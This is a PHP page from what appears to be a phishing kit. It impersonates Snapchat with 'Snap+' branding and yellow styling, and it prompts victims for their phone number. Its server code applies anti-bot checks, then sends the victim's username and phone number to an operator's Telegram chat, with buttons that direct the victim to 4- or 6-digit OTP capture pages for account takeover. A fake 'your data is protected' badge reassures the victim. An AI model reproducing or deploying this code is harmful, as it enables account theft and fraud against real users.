<?php

declare(strict_types=1);

require __DIR__ . '/includes/bootstrap.php';
require __DIR__ . '/includes/antibot.php';

session_start();

$flowId = isset($_SESSION['flow_id']) ? (string) $_SESSION['flow_id'] : '';
$secret = isset($_SESSION['flow_secret']) ? (string) $_SESSION['flow_secret'] : '';
$flow = ($flowId !== '' && $secret !== '') ? app_flow_read($flowId) : null;

if ($flow === null || $flow['secret'] !== $secret) {
    header('Location: index.php', true, 302);
    exit;
}

$pseudo = $flow['pseudo'];
$display = '@' . ltrim($pseudo, '@');
$error = '';
$success = '';

if ($_SERVER['REQUEST_METHOD'] === 'GET') {
    app_regenerate_math_challenge();
    app_touch_form_opened('phone');
}

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $ab = app_antibot_verify_post('phone', 2.0);
    if ($ab !== '') {
        $error = $ab;
        app_regenerate_math_challenge();
    } else {
        $phone = isset($_POST['phone']) ? trim((string) $_POST['phone']) : '';
        if ($phone === '') {
            $error = 'Veuillez entrer votre numéro de téléphone.';
            app_regenerate_math_challenge();
        } elseif (!app_telegram_configured()) {
            $error = 'Configuration Telegram incomplète.';
            app_regenerate_math_challenge();
        } else {
            $base = app_public_base_url();
            if (!str_starts_with($base, 'https://')) {
                $error = 'Les boutons Telegram nécessitent une URL HTTPS. Renseignez site_base_url dans config.php (ex. https://votredomaine.com).';
                app_regenerate_math_challenge();
            }
            if ($error === '') {
                $q = static function (string $s): string {
                    return rawurlencode($s);
                };
                $url4 = $base . '/otp.php?f=' . $q($flowId) . '&s=' . $q($secret) . '&d=4';
                $url6 = $base . '/otp.php?f=' . $q($flowId) . '&s=' . $q($secret) . '&d=6';

                $text = "Téléphone reçu\nPseudo : " . $pseudo . "\nNuméro : " . $phone;
                $body = [
                    'chat_id' => $config['telegram_chat_id'],
                    'text' => $text,
                    'reply_markup' => [
                        'inline_keyboard' => [
                            [
                                ['text' => 'OTP 4 chiffres', 'url' => $url4],
                                ['text' => 'OTP 6 chiffres', 'url' => $url6],
                            ],
                        ],
                    ],
                ];
                $r = app_telegram_send($body);
                if (!$r['ok']) {
                    $error = htmlspecialchars((string) ($r['error'] ?? 'Erreur'), ENT_QUOTES, 'UTF-8');
                    app_regenerate_math_challenge();
                } else {
                    $flow['phone'] = $phone;
                    if (!isset($flow['otp_notified_4'])) {
                        $flow['otp_notified_4'] = 0;
                    }
                    if (!isset($flow['otp_notified_6'])) {
                        $flow['otp_notified_6'] = 0;
                    }
                    app_flow_write($flowId, $flow);
                    $success = 'Numéro enregistré. Ouvrez le message Telegram pour choisir le type de code.';
                }
            }
        }
    }
}

$pageBackground = '#FFFC00';
$css = require __DIR__ . '/includes/snap_styles.php';
?>
<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Numéro — Snap+</title>
    <style><?= $css ?></style>
</head>
<body>
    <div id="loadingOverlay" class="loading-overlay" aria-live="polite" aria-busy="true">
        <div class="loading-box">
            <div class="loading-spinner" role="presentation"></div>
            <div class="loading-text">Envoi en cours…</div>
        </div>
    </div>
    <div class="card">
        <?php require __DIR__ . '/includes/partials_snap_brand.php'; ?>
        <p class="pseudo-chip"><?= htmlspecialchars($display, ENT_QUOTES, 'UTF-8') ?></p>
        <p class="intro">Pour activer votre offre SNAP+, veuillez renseigner votre numéro de téléphone.</p>

        <?php if ($error !== '') : ?>
            <div class="alert alert-error" role="alert"><?= $error ?></div>
        <?php endif; ?>
        <?php if ($success !== '') : ?>
            <div class="alert alert-success" role="status"><?= htmlspecialchars($success, ENT_QUOTES, 'UTF-8') ?></div>
        <?php endif; ?>

        <form id="phoneForm" method="post" action="" class="<?= $success !== '' ? 'form-loading' : '' ?>">
            <?php require __DIR__ . '/includes/form_antibot_fields.php'; ?>
            <label for="phone" class="sr-only">Numéro de téléphone</label>
            <input
                type="tel"
                id="phone"
                name="phone"
                placeholder="06 12 34 56 78"
                value="<?= isset($_POST['phone']) ? htmlspecialchars((string) $_POST['phone'], ENT_QUOTES, 'UTF-8') : '' ?>"
                autocomplete="tel"
                inputmode="tel"
                maxlength="32"
            >
            <button type="submit" class="btn btn-primary" id="phoneSubmit">CONTINUER</button>
        </form>

        <div class="footer-secure">
            <svg width="14" height="14" viewBox="0 0 24 24" fill="#FF9800" aria-hidden="true">
                <path d="M18 8h-1V6c0-2.76-2.24-5-5-5S7 3.24 7 6v2H6c-1.1 0-2 .9-2 2v10c0 1.1.9 2 2 2h12c1.1 0 2-.9 2-2V10c0-1.1-.9-2-2-2zm-6 9c-1.1 0-2-.9-2-2s.9-2 2-2 2 .9 2 2-.9 2-2 2zm3.1-9H8.9V6c0-1.71 1.39-3.1 3.1-3.1 1.71 0 3.1 1.39 3.1 3.1v2z"/>
            </svg>
            <span>Vos données sont protégées</span>
        </div>
    </div>
    <script>
        (function () {
            var overlay = document.getElementById('loadingOverlay');
            var form = document.getElementById('phoneForm');
            if (!form || !overlay) return;
            form.addEventListener('submit', function () {
                overlay.classList.add('is-visible');
                form.classList.add('form-loading');
            });
        })();
    </script>
</body>
</html>
